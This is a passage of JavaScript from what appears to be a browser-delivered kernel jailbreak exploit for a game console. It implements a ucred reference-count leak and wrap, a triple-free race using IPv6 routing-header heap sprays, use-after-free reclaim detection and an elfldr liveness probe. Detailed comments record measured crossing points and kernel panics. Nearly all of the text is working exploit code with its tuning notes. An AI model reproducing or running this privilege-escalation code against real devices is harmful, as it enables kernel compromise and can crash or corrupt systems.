                    // ~5 chain slots per call => 700 calls/chain => 2.29M in ~3s.
                    let deficit = want - executed;
                    if (deficit > 0n) {
                        const PER_CHAIN = 700;          // 700*5 slots*8 = 28000 < 32768 cap
                        const POC = 0x800000000000n;
                        const kqnum = Number(SYSCALL.kqueueex);
                        const t0 = Date.now();
                        let done = 0n, nextMark = 500000n;
                        while (done < deficit) {
                            let n = Number(deficit - done);
                            if (n > PER_CHAIN) n = PER_CHAIN;
                            const calls = new Array(n);
                            for (let i = 0; i < n; i++) calls[i] = [kqnum, POC];
                            window.syscallBatch(calls);
                            done += BigInt(n);
                            if (done >= nextMark) {
                                nextMark += 500000n;
                                window.syncMark("KQ-TOPUP", "issued " + done + "/" + deficit);
                            }
                            // keep the screen honest during the ~2 min top-up: without this
                            // the display sits on stale DRAIN text and looks hung
                            if ((done % 20000n) < BigInt(PER_CHAIN))
                                window.liveStatus("TOP-UP - re-issuing the leak calls that"
                                    + " died at falloc\n" + done + " / " + deficit + " calls",
                                    Number((done * 100n) / deficit), "topup");
                        }
                        window.syncMark("KQ-TOPUP", "DONE issued=" + done + " in "
                            + ((Date.now() - t0) / 1000).toFixed(1) + "s");
                        const kq2 = window.__measure_kqcnt("AFTER-TOPUP");
                        if (kq2 !== null) {
                            const ex2 = kq2 - window.__kqcnt_start;
                            window.syncMark("KQCNT-FINAL", "executed=" + ex2 + " want=" + want
                                + (ex2 >= want
                                    ? "  => LEAK NOW COMPLETE, cr_ref wrapped; burn should cross at ~C0"
                                    : "  => STILL SHORT by " + (want - ex2)));
                        }
                    }
                }
            }

            // THE POOL MUST CONTAIN EXACTLY free_fds_num REAL DESCRIPTORS.
            // TOTAL_SYSCALLS was computed as 2^32 + 1 - free_fds_num, so cr_ref only lands
            // on C0 + 1 if we really open that many. MEASURED FAILURE: 7035 of 7680 entries
            // were the literal value 24 (EMFILE) stored as fds, so the real N was ~645 and
            //     cr_ref = C0 + (2^32 + 1 - 7680) + 645 = C0 - 7034  (mod 2^32)
            // which wraps NEGATIVE and is unreachable by any number of closes. That is the
            // NO FREE. Validate by monotonicity (open returns the lowest available fd) and
            // STOP THE RUN rather than continue on a pool that silently poisons cr_ref.
            let pool_prev = -1;
            for (let i = 0; i < free_fds_num; i++) {
                const fd = new_free_fd();
                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                const n = Number(fd & 0xFFFFFFFFn);
                if (n <= pool_prev || n < 3) {
                    window.syncMark("POOL-SHORT", "open() returned errno " + toHex(fd)
                        + " at i=" + i + "/" + free_fds_num
                        + " (prev fd=" + pool_prev + "). The leak was sized for "
                        + free_fds_num + " fds but only " + i + " are real, so cr_ref is off"
                        + " by " + (free_fds_num - i) + " and can never reach 0.");
                    fail("pool short: only " + i + "/" + free_fds_num + " real fds"
                        + " (errno " + toHex(fd) + "); TOTAL_SYSCALLS assumed "
                        + free_fds_num + " - rerun with a smaller pool");
                }
                pool_prev = n;
                S.free_fds.push(n);
            }
            // VALIDATE THE POOL. open() returns the LOWEST AVAILABLE descriptor, so a
            // healthy pool is strictly increasing. A failed open returns errno in RAX
            // (2=ENOENT, 9=EBADF, 24=EMFILE...) which is a small positive number and
            // therefore passes the `=== -1` guard and looks like a valid fd. Such an entry
            // would be closed as a no-op (or worse, close a REAL browser fd), and the burn
            // would then walk thousands of closes without dropping a single ucred ref.
            // Monotonicity catches it without needing the carry flag.
            {
                let bad = [], prev = -1;
                for (let i = 0; i < S.free_fds.length; i++) {
                    const v = S.free_fds[i];
                    if (v <= prev || v < 16) bad.push(i + ":" + v);
                    prev = v;
                }
                window.syncMark("POOL-CHECK", "n=" + S.free_fds.length
                    + " first=" + S.free_fds[0] + " last=" + S.free_fds[S.free_fds.length - 1]
                    + (bad.length ? "  *** " + bad.length + " NON-MONOTONIC (errno posing as fd): "
                                    + bad.slice(0, 8).join(" ") + " ***"
                                  : "  strictly increasing - all real fds"));
            }
            syscall(SYSCALL.setuid, 1n);

            await js_sleep(10000);
        }

        function free_one_fd(S) {

            if (S.free_fd_idx >= S.free_fds.length)
                fail("free_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            // CHECK THE CLOSE. Our syscall path returns RAX only - the ROP chain never
            // captures the carry flag - so a FAILED syscall comes back as a plain positive
            // errno, indistinguishable from success. For close() that ambiguity does not
            // exist: success is exactly 0, anything else is errno. And this matters
            // enormously: every close here is supposed to drop one ucred ref, so a silently
            // failing close means cr_ref never moves - which is exactly what a burn of
            // 7456 closes with NO FREE looks like.
            const r = toBigSafe(syscall(SYSCALL.close, BigInt(S.free_fds[S.free_fd_idx])));
            if ((r & 0xFFFFFFFFn) !== 0n) {
                S._closeFail = (S._closeFail || 0) + 1;
                if (S._closeFail <= 8)
                    window.syncMark("CLOSE-FAIL", "idx=" + S.free_fd_idx
                        + " fd=" + S.free_fds[S.free_fd_idx]
                        + " ret=" + toHex(r) + " (errno; this close dropped NO ucred ref)");
            }
            S.free_fd_idx++;
        }

        // Returns the next pool fd and advances the index WITHOUT closing it, so the close
        // can be fused into the SAME ROP chain as the reclaim spray. Split across two
        // worker wakes there is a ~1ms window in which any 255..510 byte allocation in the
        // system can take the freed chunk first - that zone serves every allocation in
        // that range, so the window is not theoretical.
        function take_one_fd(S) {
            if (S.free_fd_idx >= S.free_fds.length)
                fail("take_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            return S.free_fds[S.free_fd_idx++];
        }

        // GATE WIDTH MUST EQUAL THE RACER COUNT. Each racer blocks in recvmsg on
        // iov_sock_a and consumes ONE byte, so the release write must carry
        // IOV_THREAD_NUM bytes to free ALL of them at once. This port wrote 1 byte, so
        // exactly ONE racer was released per round - and a race whose whole premise is N
        // threads hitting the same window simultaneously can never win with one thread.
        // The drain read was short by the same factor, leaving bytes in the socket and
        // desyncing the gate across rounds. Original p2jb.c attempt_race:
        //     worker_signal_work(&ctx->iov_state, 0);
        //     fn_sched_yield();
        //     fn_write(ctx->iov_ss[1], tmp, IOV_THREAD_NUM);
        //     worker_wait_for_finished(&ctx->iov_state);
        //     fn_read (ctx->iov_ss[0], tmp, IOV_THREAD_NUM);
        const IOV_GATE = BigInt(IOV_THREAD_NUM);
        function flush_iov_workers(S, count) {
            for (let i = 0; i < count; i++) {
                S.iov_ws.signal();
                syscall(SYSCALL.sched_yield);          // original yields before releasing
                rcMark("RC", "6-wake-write");
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
                rcMark("RC", "7-iov-wait");
                S.iov_ws.wait();
                rcMark("RC", "8-drain-read");
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            }
        }

        async function attempt_race(S) {

            rcMark("RC", "1-free-rthdrs");
            for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
            free_one_fd(S);
            rcMark("RC", "2-flush-iov");
            flush_iov_workers(S, 32);
            free_one_fd(S);
            rcMark("RC", "3-find-twins");

            const twins = await find_twins(S, MAX_ROUNDS_TWIN);
            if (!twins) { S._fail = 'twins'; return false; }

            rcMark("RC", "4-twins-ok-" + twins[0] + "," + twins[1]);
            rthdr_free_idx(S, twins[1]);
            sched_yield_n(2);

            const verify_buf = malloc(UCRED_SIZE);
            const verify_len = malloc(4);
            let reclaimed = false;

            for (let k = 0; k < MAX_ROUNDS_TRIPLET; k++) {
                rcMark("RC", "5-signal-k");
                S.iov_ws.signal();
                sched_yield_n(4);
                write32(verify_len, 8n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[twins[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (read32(verify_buf) === 1n) {
                    reclaimed = true;
                    break;
                }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            }
            if (!reclaimed) { S._fail = 'reclaim'; return false; }

            S.triplets[0] = twins[0];
            free_one_fd(S);
            syscall(SYSCALL.sched_yield);

            rcMark("RC", "9-find-triplet1");
            S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (S.triplets[1] === -1) { S._fail = 't1'; return false; }

            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
            rcMark("RC", "10-find-triplet2");
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET);
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            if (S.triplets[2] === -1) { S._fail = 't2'; return false; }

            return true;
        }

        // Is elfldr already listening on the console? This is the only GROUND TRUTH for
        // "already jailbroken" that we can actually obtain.
        //
        // The page's pre-run check can only read browser storage, which is empty on a fresh
        // session even when the console really IS jailbroken - which is how a jailbroken
        // console ends up grinding the 2^32 leak for an hour against an already-patched
        // kernel. The exploit host cannot answer it either: its binary contains only
        // /latch and /api/payload/<name> and no elfldr status route at all, and
        // /api/payload proves liveness only by actually SENDING an ELF, which is an action
        // rather than a probe.
        //
        // By the time stage0 runs we have syscalls ON THE CONSOLE, so we can simply try to
        // connect to 127.0.0.1:9021. That succeeds only while elfldr is accepting, and
        // elfldr does not survive a reboot - so unlike a stored flag this can never report
        // a stale yes. Cost is one socket() and one connect() on loopback.
        function elfldr_alive() {
            let fd = -1n;
            try {
                fd = syscall(SYSCALL.socket, 2n, 1n, 0n);           // AF_INET, SOCK_STREAM
                if ((fd & 0xFFFFFFFFn) > 0xFFFFn) return false;    // negative -> errno
                // struct sockaddr_in { u8 len=16; u8 family=2; u16 port_be; u32 addr_be; u64 pad; }
                // 9021 = 0x233D big-endian -> 23 3D ; 127.0.0.1 -> 7F 00 00 01
                const sa = malloc(16);
                write64(sa, 0x0100007F3D230210n);
                write64(sa + 8n, 0n);
                const r = syscall(SYSCALL.connect, fd, sa, 16n);
                return (r & 0xFFFFFFFFn) === 0n;
            } catch (e) {
                return false;
            } finally {
                try {
                    if ((fd & 0xFFFFFFFFn) <= 0xFFFFn) syscall(SYSCALL.close, fd);
                } catch (e) { }
            }
        }

        async function stage0(S) {
            send_notification("Stage 0\nTriple-free race");

            if (failcheck_path) {
                try { write_file(failcheck_path, ""); } catch (_) { }
            }
            // ---- CALIBRATED BURN (DIAGNOSTIC, ?burn=1 ONLY) ----------------------
            // CORRECTED MODEL - the reasoning below is kept for the record but its premise
            // is WRONG. f_cred is fixed at falloc time, so every file opened before
            // setuid#1 points at a DIFFERENT cred and never counts toward cred A; and the
            // pool's +N cancels the leak's -N. So cr_ref(A) = T + 2 (threads + p_ucred),
            // and the crossing is a few TENS of closes - which is exactly what upstream's
            // R_ESTIMATE=83 encodes, and exactly what attempt_race's ~290 closes cover.
            // The "NO_FREE at 512" that motivated this burn came from a run whose leak was
            // 2.29M SHORT, so cr_ref had not wrapped at all and no number of closes could
            // ever have crossed. That measurement was void.
            if (_burn) {
            // (original rationale, now known to be mistaken:)
            // After the leak cr_ref == R_base + 1, where R_base is EVERY reference the
            // process holds: p_ucred, each thread's td_ucred, and every open file's
            // f_cred. p2jb assumes R_ESTIMATE=83 (fine for Y2JB's small host app), but we
            // run inside the WebProcess which keeps hundreds of fds open, so R_base is
            // far larger. Closing only 2 fds per attempt (192 over 96 attempts) can never
            // drive cr_ref to 0 -> the ucred is never freed -> find_twins cannot fire.
            // That is exactly the observed 96/96 with zero variance.
            // So: close fds until the free ACTUALLY lands, detected with the UID oracle
            // (cr_uid is at ucred+0x04, our tag is at spray+0x04, so a reclaimed ucred
            // makes getuid() return 0x1337xxxx). Self-calibrating - no R estimate needed.
            {
                // Reserve what the attempt loop needs (2 closes x TRIPLEFREE_ATTEMPTS)
                // so a non-hitting burn cannot starve the race into a pool-exhausted FATAL.
                // C0 MEASURED: FD-BASE reported first_fd=79, so the WebProcess holds only
                // ~79 fds; C0 = fds + threads + 1 is on the order of 100-200, NOT >3360.
                // cr_ref therefore reaches 0 after ~C0 closes and the ucred IS freed - the
                // oracle was silent because our spray never RECLAIMS the chunk, not because
                // the free never happened. Closing thousands more past that point performs
                // crfree after crfree on freed memory (corrupting whatever now owns it), so
                // stop shortly past the expected crossing instead of burning the whole pool.
                // DO NOT CAP THIS AT AN ASSUMED C0. The previous 512 ceiling came from
                // reading FD-BASE first_fd=207 as "C0 is about 100-200", but that is the
                // lowest FREE DESCRIPTOR NUMBER, not the reference count. cr_ref counts
                // EVERY holder: every open file, every thread's td_ucred, p_ucred, and
                // anything else that called crhold. In a WebProcess that is easily well
                // past 512 - and once the budget is short of C0 the loop simply stops
                // before the crossing and prints NO_FREE, which is exactly the verdict we
                // got twice. C0 is not something to estimate; burn the pool and MEASURE
                // where the free lands. We stop at the FIRST deviation, so we never close
                // past the crossing.
                const reserve = 2 * TRIPLEFREE_ATTEMPTS + 32;
                const budget = Math.max(0, S.free_fds.length - reserve);
                let burned = 0, hit = 0;
                // THE CORRECT CROSSING DETECTOR.
                // The UID oracle below CANNOT fire, by construction. setuid(1) is called
                // again AFTER the pool is built, and sys_setuid ALWAYS installs a fresh
                // ucred (`mov [p+0x40], newcred`) and crfree's the old one - crcopy is
                // memcpy(dst+4, src+4, 0xDC), so cr_ref is never copied and the new cred
                // starts at 1. That is DELIBERATE (upstream does the same): it detaches
                // cred A from the process while our N pool fds keep dangling f_cred=A
                // references, so burning the pool drives A to zero. But getuid/geteuid
                // read td_ucred = B, NOT A - so no uid can ever change no matter what
                // happens to A. find_twins cannot cover this either: twins need a DOUBLE
                // free to alias two sockets, and the burn produces a single free.
                // What IS observable: once A is freed and one of our rthdrs reclaims the
                // chunk, every FURTHER close runs crfree on that chunk and decrements its
                // first dword - which is our rthdr header (nxt/len/type/segleft), a known
                // constant. So read back every socket's first dword and look for the one
                // that stopped matching. That pinpoints the crossing AND the owning socket.
                const TWB = twin_bufs(S);
                const burn_reads = [];
                for (let i = 0; i < S.ipv6_count; i++)
                    burn_reads.push([Number(SYSCALL.getsockopt), BigInt(S.ipv6_sockets[i]),
                        IPPROTO_IPV6, IPV6_RTHDR, TWB.bufs[i], TWB.lens[i]]);
                // Baseline from what the KERNEL ACTUALLY STORED, not from our userland
                // buffer: ip6_setpktopt may normalise header fields on the way in, and a
                // baseline taken from the source buffer would then mismatch on EVERY
                // socket at the first close - an instant false CHUNK-HIT that aborts the
                // burn at burned=1 and wastes the whole run.
                window.syscallBatchTagged(spray_items_for(S), Number(SYSCALL.setsockopt),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_spray, BigInt(S.rthdr_spray_len));
                for (let i = 0; i < S.ipv6_count; i++) write32(TWB.lens[i], 8n);
                window.syscallBatch(burn_reads);
                // Take the MODAL header as the baseline and keep only the sockets that
                // match it. A dead fd (EBADF) makes getsockopt fail and leaves the buffer
                // ZEROED, which reads as 0x0 and fires CHUNK-HIT on the very first close -
                // exactly what killed the v64 run (sock[9], the known EBADF socket). The
                // _deadSock filter does NOT help here: it is only populated by SPRAY-CHECK
                // inside attempt_race, which runs AFTER the burn. So self-calibrate.
                const hdrCount = new Map();
                for (let i = 0; i < S.ipv6_count; i++) {
                    const v = Number(read32(TWB.bufs[i]) & 0xFFFFFFFFn);
                    hdrCount.set(v, (hdrCount.get(v) || 0) + 1);
                }
                let HDR_EXPECT = 0, best = -1;
                for (const [v, n] of hdrCount) if (n > best) { best = n; HDR_EXPECT = v; }
                const watch = [];
                for (let i = 0; i < S.ipv6_count; i++)
                    if (Number(read32(TWB.bufs[i]) & 0xFFFFFFFFn) === HDR_EXPECT) watch.push(i);
                const hdrUniform = watch.length;
                window.syncMark("BURN", "start budget=" + budget
                    + " hdr_expect=0x" + (HDR_EXPECT >>> 0).toString(16)
                    + " (sampled from kernel; uniform on " + hdrUniform + "/" + S.ipv6_count
                    + " sockets, userland buf=0x"
                    + (Number(read32(S.rthdr_spray) & 0xFFFFFFFFn) >>> 0).toString(16)
                    + ") - watching for crfree damage");
                if (hdrUniform < S.ipv6_count)
                    window.syncMark("BURN-WARN", "header NOT uniform across sockets ("
                        + hdrUniform + "/" + S.ipv6_count + ") - CHUNK-HIT may false-positive");
                for (let k = 0; k < budget; k++) {
                    const fd_to_close = take_one_fd(S); burned++;
                    // Probe after EVERY close. cr_ref reaches 0 on exactly one close; any
                    // close past that point calls crfree on already-freed memory and lets
                    // some other allocation win the chunk before our spray. Batched, so
                    // one spray+getuid is ~1ms - the whole burn costs about a second.
                    // re-spray so a freed ucred gets our tag at +0x04, then ask the kernel
                    // ATOMIC free+reclaim: close(fd) and the whole spray go into ONE chain,
                    // so the freed chunk is reclaimed on the same core with no worker
                    // round-trip in between. Same-core per-CPU UMA LIFO only reclaims
                    // deterministically if the spray is in the SAME chain, not merely on
                    // the same core.
                    window.leadThenBatchTagged(
                        [Number(SYSCALL.close), BigInt(fd_to_close)],
                        spray_items_for(S), Number(SYSCALL.setsockopt),
                        IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_spray, BigInt(S.rthdr_spray_len));
                    // READ THE FIELD THE TAG ACTUALLY LANDS IN. Verified by disassembly on
                    // BOTH 12.00 and 12.70 (identical code):
                    //   sys_getuid : mov rax,[rdi+0x140]; mov eax,[rax+8] -> cr_ruid (+0x08)
                    //   sys_geteuid: mov rax,[rdi+0x140]; mov eax,[rax+4] -> cr_uid  (+0x04)
                    // The tag is written at spray+0x04, so getuid() could NEVER see it and
                    // the "OUR TAG" branch was unreachable by construction. geteuid() is the
                    // matching oracle; getuid() stays as a second witness (the spray is
                    // zeroed at +0x08, so a reclaim drops it from 1 to 0).
                    // PRIMARY DETECTOR: has crfree started damaging a reclaimed chunk?
                    for (let i = 0; i < S.ipv6_count; i++) write32(TWB.lens[i], 8n);
                    window.syscallBatch(burn_reads);
                    // Only the sockets that matched the modal baseline, and only a value
                    // that looks like an actual crfree DECREMENT. A dead fd reads back as
                    // 0x0 and any "!= expect" test turns that into an instant false hit
                    // (v64 died this way at burned=1 on the known EBADF sock[9]).
                    // crfree subtracts 1 per close, so a genuine hit is slightly BELOW
                    // the baseline, never zero and never wildly off.
                    let hdrBad = -1, hdrVal = 0;
                    for (const i of watch) {
                        const v = Number(read32(TWB.bufs[i]) & 0xFFFFFFFFn);
                        if (v === HDR_EXPECT) continue;
                        const delta = HDR_EXPECT - v;
                        if (delta > 0 && delta < 0x10000) { hdrBad = i; hdrVal = v; break; }
                        if (!S._hdrOddSeen) {          // report, but do NOT trip on it
                            S._hdrOddSeen = 1;
                            window.syncMark("HDR-ODD", "sock[" + i + "] hdr=0x"
                                + (v >>> 0).toString(16) + " expect=0x"
                                + (HDR_EXPECT >>> 0).toString(16)
                                + " delta=" + delta + " - not a crfree decrement, ignoring");
                        }
                    }
                    if (hdrBad >= 0) {
                        hit = 1;
                        window.syncMark("CHUNK-HIT", "after " + burned + " closes:"
                            + " sock[" + hdrBad + "] hdr=0x" + (hdrVal >>> 0).toString(16)
                            + " expect=0x" + (HDR_EXPECT >>> 0).toString(16)
                            + "  => ucred A was FREED and our rthdr RECLAIMED it;"
                            + " crfree is now decrementing our chunk. C0=" + burned);
                        break;
                    }
                    // SECONDARY, kept only as a witness - see the note above: this can
                    // never fire, because it reads cred B while cred A is the one freed.
                    const uid = Number(syscall(SYSCALL.geteuid) & 0xFFFFFFFFn);
                    const ruid = Number(syscall(SYSCALL.getuid) & 0xFFFFFFFFn);
                    // Report ANY deviation from the baseline, not just our tag. C0 is only
                    // ~100 (FD-BASE first_fd=79), so the ucred is genuinely freed early in
                    // this loop - if the oracle stays silent it means SOMETHING ELSE
                    // reclaimed the chunk, and only a widened check can tell that apart
                    // from "the free never happened". Both are useful; they need different fixes.
                    if ((uid !== 1 || ruid !== 1) && !S._uidDeviated) {
                        S._uidDeviated = 1;
                        window.syncMark("UID-DEVIATE", "after " + burned + " closes euid=0x"
                            + (uid >>> 0).toString(16) + " ruid=0x" + (ruid >>> 0).toString(16)
                            + ((uid & 0xFFFF0000) === RTHDR_TAG ? " (OUR TAG)" : " (foreign reclaim)"));
                    }
                    if ((uid & 0xFFFF0000) === RTHDR_TAG) {
                        hit = 1;
                        window.syncMark("BURN", "UCRED FREED+RECLAIMED after " + burned
                            + " closes  uid=0x" + (uid >>> 0).toString(16)
                            + " sock=" + (uid & 0xFFFF) + "  => R_base=" + (burned - 1));
                        break;
                    }
                    if ((k & 0x3F) === 0x3F)
                        window.liveStatus("BURN - walking cr_ref down\n"
                            + burned + " / " + budget + " closes"
                            + "\nwatching " + watch.length + " rthdr headers for crfree damage",
                            (burned * 100) / budget, "burn");
                    if ((k & 0x1FF) === 0x1FF)
                        window.syncMark("BURN", "closed=" + burned + "/" + budget
                            + " euid=0x" + (uid >>> 0).toString(16)
                            + " ruid=0x" + (ruid >>> 0).toString(16));
                }
                if (!hit)
                    window.syncMark("BURN", "NO FREE after " + burned + "/" + budget
                        + " closes - cr_ref never reached 0. Budget is now the WHOLE pool,"
                        + " so C0 > pool or the leak did not wrap (see KQCNT-VERDICT)");
            }
            } else {
                // SILENT PRE-BURN. MEASURED: with honest fd counts the crossing sits at
                // ~400-430 closes (the ?burn=1 runs walked 325 with NO free, then the race
                // crossed ~30 attempts in: v72 landed at attempt 35, v73 panicked ~24-32).
                // attempt_race alone supplies only ~250 closes (96 x 2-3), so WITHOUT some
                // pre-walk it now falls SHORT and fails cleanly at twins=96.
                // But the diagnostic burn is the wrong tool: it sprays 192 sockets after
                // EVERY close, churning the 512 bucket and handing the race a heap already
                // at the crossing, so the race crosses MID-SEQUENCE instead of owning the
                // free -> iov write -> free -> alias order. That is what turns a landing
                // into a panic.
                // So: walk cr_ref down with NO spray and NO probing, stopping well SHORT of
                // the crossing, and let attempt_race own the last stretch exactly as
                // upstream does.
                // THE CEILING WAS UNREACHABLE. MEASURED 2026-08-27.
                // A FAILING attempt closes exactly TWO fds - attempt_race frees one
                // before flush_iov_workers and one after, and the third free_one_fd only
                // runs once reclaim has SUCCEEDED. So 120 attempts supplied 240 closes,
                // not the 260 RACE_RUNWAY claimed, and the total reach was
                // preburn 170 + 240 = 410 against a C0_HINT of 430: the design could
                // never arrive at its own hint. A boot whose C0 sat above 410 failed
                // cleanly at twins=120 with the pool still 140 fds deep - exactly what
                // 10.0.0.106 did (CENSUS examined=230400 untouched=230400 tagAbsent=0,
                // nothing ever touched), while the same build crossed at attempt ~17-23
                // on the devkit minutes later.
                //
                // The POOL is the real bound. preburn is capped at pool - (2*N + 32), so
                // total reach = preburn + 2*N <= pool - 32 however the two knobs are set:
                // retail pool 582 -> 550, devkit 545 -> 513. So size the race from the
                // pool rather than from constants that silently assume one:
                //   * preburn keeps its proven cap of 170. Four wins crossed at ~172-232
                //     closes with preburn 170, so it stays below the smallest observed C0
                //     and the crossing still lands INSIDE the race, where the spray runs.
                //     That is the entire point of the blind walk - see the runway note
                //     below - and it is why this cap does not scale with the pool.
                //   * the race then gets every remaining fd bar a 32 reserve.
                // Closing more fds BEFORE the crossing is harmless (an ordinary crfree on
                // a live, referenced ucred), and POST_CROSSING_BUDGET still caps exposure
                // AFTER it, so the extra attempts cost wall-clock and nothing else.
                // RACE_RUNWAY was 150 (preburn 280) and that is TOO TIGHT. Measured
                // crossing attempts with preburn=280: 35, 27, 10, 4, 13 -> at ~2-3 closes
                // per failing attempt that puts C0 anywhere in ~288..385 across boots.
                // v80 crossed at attempt 4 - about 10 closes into the race. A boot whose
                // C0 falls below the preburn crosses DURING THE SILENT PRE-BURN, where
                // there is deliberately NO SPRAY, so the freed ucred is reclaimed by the
                // kernel instead of by us -> v83's no-output kernel panic.
                // 200 leaves preburn=230, comfortably under the smallest observed C0, so
                // the crossing always lands inside the race with the spray running:
                //   C0 288 -> ~attempt 23     C0 385 -> ~attempt 62   (both << 96)
                // MEASURED 2026-08-26, one devkit console, two boots, preburn 230 both times:
                //   boot A  won at attempt 17 (twins=16)  -> crossing ~262 closes
                //   boot B  PANIC at attempt 4 (twins=3)  -> crossing ~237 closes
                // 230 left 32 closes of margin on A and ~7 on B, and a boot with C0 below
                // 230 crosses inside this spray-free walk, which is the no-output panic
                // this design exists to avoid. C0 is not a constant and is not measured,
                // so the runway has to cover the spread rather than the average: 260 puts
                // the pre-burn at 170, ~67 closes below the lowest C0 seen.
                // 170 was TWO closes from the mechanism it exists to avoid: retail crossed
                // at attempt 1-2 on 2026-08-27, i.e. C0 ~172-174. A boot whose C0 falls
                // below the pre-burn crosses inside this silent, spray-free walk, where the
                // kernel reclaims the freed ucred instead of us - the no-output panic.
                // Since the reach is pool-derived it is ~pool-32 REGARDLESS of this cap, so
                // lowering it costs nothing in reach; it only moves closes out of the blind
                // walk and into the sprayed race, which is where upstream does them anyway.
                // Observed crossings run ~172-232, and wins have happened as late as
                // attempt 31, so a race that starts ~36 attempts before the earliest known
                // C0 is well inside proven territory.
                const PREBURN_CAP = 100;   // ~72 closes of margin, same reach as 170
                const POOL_RESERVE = 32;
                const pool = S.free_fds.length - S.free_fd_idx;
                let preburn = Math.min(PREBURN_CAP,
                                       Math.max(0, pool - POOL_RESERVE - 2 * 8));
                if (preburn < 0) preburn = 0;
                // Every fd the pre-burn did not take, minus the reserve, at 2 per attempt.
                TRIPLEFREE_ATTEMPTS = Math.max(
                    8, Math.floor((pool - POOL_RESERVE - preburn) / 2));
                const RACE_RUNWAY = 2 * TRIPLEFREE_ATTEMPTS;  // what the race ACTUALLY closes
                const C0_HINT = preburn + RACE_RUNWAY;        // the true reach, not a guess
                S._c0hint = C0_HINT;      // so CENSUS-VERDICT names a number we can act on
                window.syncMark("PREBURN", "closing " + preburn + " fds SILENTLY"
                    + " (no spray) - reach=" + C0_HINT + " runway=" + RACE_RUNWAY
                    + " attempts=" + TRIPLEFREE_ATTEMPTS
                    + " pool=" + S.free_fds.length
                    + "; attempt_race then owns the crossing, upstream-style");
                // Report progress and yield periodically. This loop is "silent" in the
                // sense that it emits no BEACONS (an XHR per close would perturb the fd
                // state it is manipulating), but it was also silent to the SCREEN: a tight
                // synchronous loop over a few hundred closes with no await, so the readout
                // - including the elapsed clock - froze solid until the race started. What
                // is deliberate here is the absence of beacons, not the absence of a
                // repaint, so this does a DOM-only update and a zero-length yield every 32
                // closes. It changes the count of nothing; only the crossing count matters.
                // NO DETECTOR IS POSSIBLE INSIDE THIS LOOP, and it is worth writing down
                // why, because both obvious ones are dead:
                //   * geteuid(): setuid(1) runs AFTER the pool is built and installs a
                //     FRESH ucred, detaching cred A. getuid/geteuid read td_ucred = B, so
                //     no uid can move no matter what happens to A. (Shipped as
                //     PREBURN-CROSSED earlier on 2026-08-26; it was inert. Do not re-add.)
                //   * the CHUNK-HIT header watch from the ?burn=1 path: it only sees
                //     anything because that path RE-SPRAYS after every close, so one of our
                //     rthdrs wins the freed chunk and crfree is then caught decrementing
                //     our own header. Spraying after every close is exactly what "turns a
                //     landing into a panic" - it hands the race a heap already at the
                //     crossing.
                // So this walk is blind ON PURPOSE and the RUNWAY above is the entire
                // protection: keep preburn far enough below the smallest C0 that the
                // crossing always lands inside the race, where the spray is running.
                // Measured crossings so far: ~237 and ~262 closes on one devkit console,
                // two boots. preburn is 170.
                // POINT OF NO RETURN. From the next close on, this boot has had its
                // cr_ref walked; a page that comes back afterwards must not start again.
                // The guard that reads this lives at the arming site in p2jb.html.
                try {
                    sessionStorage.setItem("p2jb:kernel-touched", String(Date.now()));
                } catch (e) { }
                for (let k = 0; k < preburn; k++) {
                    free_one_fd(S);
                    if ((k & 31) === 31 || k === preburn - 1) {
                        window.liveStatus("PRE-BURN - walking cr_ref down to the race window"
                            + "\nclosing " + preburn + " fds with no spray"
                            + "\nclosed " + (k + 1) + " / " + preburn,
                            ((k + 1) * 100) / preburn, "preburn");
                        await js_sleep(0);
                    }
                }
                window.syncMark("PREBURN", "done, " + (S.free_fds.length - S.free_fd_idx)
                    + " fds left for the race"
                    + (S._closeFail ? "  *** " + S._closeFail + " closes FAILED ***" : ""));
            }
            const tally = { twins: 0, reclaim: 0, t1: 0, t2: 0 };
            let crossing_at = 0;   // attempt at which the double free was first proved
            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                S._fail = '?';
                // ARM THE CROSSING FROM THE CENSUS, NOT ONLY FROM THE FAILURE CLASS.
                // The failure-class test below can only fire on a failure PAST twins, but
                // failing at twins every attempt is the NORMAL path: the run that won on
                // 2026-08-26 reached attempt 17 with twins=16 and crossing_at still 0, so
                // POST_CROSSING_BUDGET never armed and the attempt cap was the only bound
                // on crfrees past a crossing nobody had noticed.
                // find_twins already measures the right thing every attempt: tagAbsent
                // counts readbacks whose tag is not ours - "the freed chunk IS being reused
                // by foreign data", which CENSUS-VERDICT in this same file calls crossing
                // reached. _census is cumulative, so compare across the attempt.
                // (geteuid cannot be used here either - see the pre-burn comment.)
                const tagAbsent0 = (S._census && S._census.tagAbsent) || 0;
                window.liveStatus("STAGE 0 - triple-free race\nattempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS
                    + "\nfailures so far: twins=" + tally.twins + " reclaim=" + tally.reclaim
                    + " t1=" + tally.t1 + " t2=" + tally.t2,
                    (attempt - 1) * 100 / TRIPLEFREE_ATTEMPTS, "race");
                if (await attempt_race(S)) {
                    await ulog("stage0: triplets " + S.triplets.join(",") +
                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                        ")");
                    nanosleep_ms(500);
                    return;
                }
                if (tally[S._fail] !== undefined) tally[S._fail]++;

                const tagAbsent1 = (S._census && S._census.tagAbsent) || 0;
                if (crossing_at === 0 && tagAbsent1 > tagAbsent0) {
